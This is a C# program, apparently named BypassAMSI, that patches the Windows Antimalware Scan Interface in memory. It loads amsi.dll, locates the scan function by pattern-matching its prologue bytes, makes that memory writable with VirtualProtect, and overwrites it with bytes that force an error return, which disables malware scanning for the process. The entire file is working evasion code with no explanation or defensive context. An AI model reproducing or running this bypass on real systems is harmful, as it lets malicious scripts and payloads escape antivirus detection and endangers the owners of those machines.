using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BypassAMSI
{
    public class Program
    {
        byte[] patch64 = new byte[] { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        byte[] patch86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        byte[] egg64 = new byte[] {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
        };
        byte[] egg86 = new byte[] {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
        };


    [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }

        private static IntPtr FindAddress(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;

                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }

        public static void Patch(string dllname, string funcname, byte[] egg, byte[] patch)
        {

            IntPtr hModule = LoadLibrary(dllname);
            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, funcname);

            /*
            byte[] egg = { };
            if (IntPtr.Size == 8)
            {
                egg = new byte[] {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                };
            }
            else
            {
                egg = new byte[] {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
                };
            }
            */

            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
            

            // PAGE_READWRITE = 0x04
            uint Oldprotect;
            uint Newprotect;

            /*
            byte[] patch = { };
            if (is64Bit())
            {
                patch = new byte[] { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            };
            */

            VirtualProtect(address, (UIntPtr)patch.Length, 4, out Oldprotect);
            Marshal.Copy(patch, 0, address, patch.Length);
            VirtualProtect(address, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
        }

        public Program()
        {
            if (is64Bit())
            {
                Patch("amsi.dll", "DllCanUnloadNow", egg64, patch64);
            }
            else
            {
                Patch("amsi.dll", "DllCanUnloadNow", egg86, patch86);
            }
        }

        static void Main(string[] args)
        {
            new Program();
        }
    }
}
